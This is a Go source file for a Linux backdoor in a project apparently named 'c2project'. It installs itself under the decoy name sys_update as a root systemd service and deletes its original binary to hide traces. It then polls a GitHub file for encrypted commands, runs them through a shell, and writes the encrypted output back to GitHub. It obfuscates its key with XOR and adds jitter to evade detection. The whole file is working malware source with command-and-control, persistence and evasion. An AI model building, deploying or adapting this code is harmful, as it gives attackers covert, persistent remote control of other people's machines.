package main

import (
	"c2project/pkg/encryption"
	"c2project/pkg/github"
	"fmt"
	"math/rand/v2"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/unix"
)

var xorKey = []byte{0xAF, 0x22, 0xC3, 0x11} // xor mask

// this is a simple XOR-obfuscated version of the key (using xorKey) to obfuscate the encryption key in a compiled binary.
var scrambledKey = []byte{0x99, 0x15, 0xf5, 0x28, 0x9d, 0x15, 0xa7, 0x24, 0x9f, 0x12, 0xfb, 0x25, 0xca, 0x43, 0xf2, 0x23, 0xce, 0x47, 0xf5, 0x23, 0x9c, 0x40, 0xf4, 0x26, 0xc9, 0x40, 0xf5, 0x26, 0x9c, 0x47, 0xf4, 0x72, 0xca, 0x15, 0xa2, 0x29, 0x99, 0x17, 0xf5, 0x25, 0x9d, 0x16, 0xf4, 0x22, 0x9b, 0x43, 0xa1, 0x75, 0x99, 0x14, 0xfb, 0x22, 0xcc, 0x14, 0xa0, 0x29, 0xce, 0x11, 0xfb, 0x27, 0x9b, 0x11, 0xf7, 0x72}

const targetPath = "/usr/local/bin/sys_update" // where we want the binary to actually be (decoy name)

func main() {
	curPath, _ := os.Executable()

	if curPath != targetPath { // we haven't installed ourself yet

		// copy binary with executable permissions to target path
		input, _ := os.ReadFile(curPath)
		if err := os.WriteFile(targetPath, input, 0755); err != nil {
			fmt.Println("Error installing:", err)
			os.Exit(1)
		}

		err := StartService(targetPath)
		if err != nil {
			fmt.Println("Error starting service:", err)
			os.Exit(1)
		}

		// delete the original binary to cover our tracks
		os.Remove(curPath)
	} else { // we're already installed and running in a service, let's commence mischief >:)
		BackdoorLoop()
	}
}

// create a service that will automatically restart the backdoor if it's killed, and more importantly, will make it run on startup to maintain persistence across reboots
func StartService(binPath string) error {
	servicePath := "/etc/systemd/system/sys_update.service"

	content := fmt.Sprintf(`[Unit]
Description=System Service Loader
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
`, binPath)

	err := os.WriteFile(servicePath, []byte(content), 0644)
	if err != nil {
		return err
	}

	// activate the service
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "sys_update.service").Run()
	exec.Command("systemctl", "start", "sys_update.service").Run()

	return nil
}

// This is the backdoor loop that continuously fetches the command file, decrypts it, executes the commands, and writes the output back to github. It includes a random delay to avoid periodicity detection. We only run once the binary has "self-installed" itself on the target machine.
func BackdoorLoop() {
	key := string(encryption.XORTransform(scrambledKey, xorKey))
	for {
		commandEncrypted, err := github.ReadFile("commands.txt")
		if err != nil {
			fmt.Println("Error fetching command file:", err)
			return
		}

		commandUnencrypted, err := encryption.DecryptString(commandEncrypted, key)
		if err != nil {
			fmt.Println("Error decrypting command:", err)
			return
		}

		timestampStr, after, found := strings.Cut(commandUnencrypted, "|")
		if !found {
			fmt.Println("Invalid command format")
			return
		}

		timestamp, err := strconv.ParseInt(timestampStr, 10, 64)
		if err != nil {
			fmt.Println("Error parsing timestamp:", err)
			return
		}

		lastCommandTime := GetLastCommandTime()
		if timestamp <= lastCommandTime {
			// no new command, sleep and check again later
			SleepWithJitter()
			continue
		}

		commands := strings.Split(after, "\n")
		outputs := make([]string, 0, len(commands))

		// run each command and store the output
		for _, command := range commands {
			command = strings.TrimSpace(command)
			if command == "" {
				continue
			}

			run := exec.Command("sh", "-c", command)
			output, err := run.CombinedOutput()
			cleanOutput := strings.TrimSpace(string(output))
			if err != nil {
				fmt.Println("Error executing command:", err)
				// Keep the error message but keep it clean
				cleanOutput = fmt.Sprintf("Error: %s\n%s", err.Error(), cleanOutput)
			}
			outputs = append(outputs, cleanOutput)
		}

		SetLastCommandTime(timestamp)

		// encrypt
		outputCombined := strings.Join(outputs, "\n")
		outputWithTimestamp := fmt.Sprintf("%d|%s", timestamp, outputCombined)
		outputEncrypted, err := encryption.EncryptString(outputWithTimestamp, key)
		if err != nil {
			fmt.Println("Error encrypting output:", err)
			return
		}

		// write back to github (overwrite the command file with the encrypted output)
		err = github.WriteFile("commands.txt", commandEncrypted, outputEncrypted)
		if err != nil {
			fmt.Println("Error writing encrypted output to github:", err)
			return
		}

		SleepWithJitter() // go dark for a period before checking for new commands again
	}
}

func SleepWithJitter() {
	time.Sleep(time.Second * time.Duration((20 + (rand.IntN(9) - 4)))) // random delay between 16-24 seconds
}

// reads last command time from the xaddr attribute of the binary, so we don't repeat commands (and are immune to replay attacks)
func GetLastCommandTime() int64 {
	dest := make([]byte, 100)

	// read the attribute
	sz, err := unix.Getxattr(targetPath, "user.last_command_time", dest)
	if err != nil {
		// if the attribute doesn't exist yet (first run), return 0
		return 0
	}

	savedTime, err := strconv.ParseInt(string(dest[:sz]), 10, 64)
	if err != nil {
		return 0 // if the data got corrupted
	}

	return savedTime
}

// writes last command time to the xaddr attribute of the binary. this is the only "state" management we need
func SetLastCommandTime(timestamp int64) {
	timeStr := strconv.FormatInt(timestamp, 10)
	unix.Setxattr(targetPath, "user.last_command_time", []byte(timeStr), 0)
}
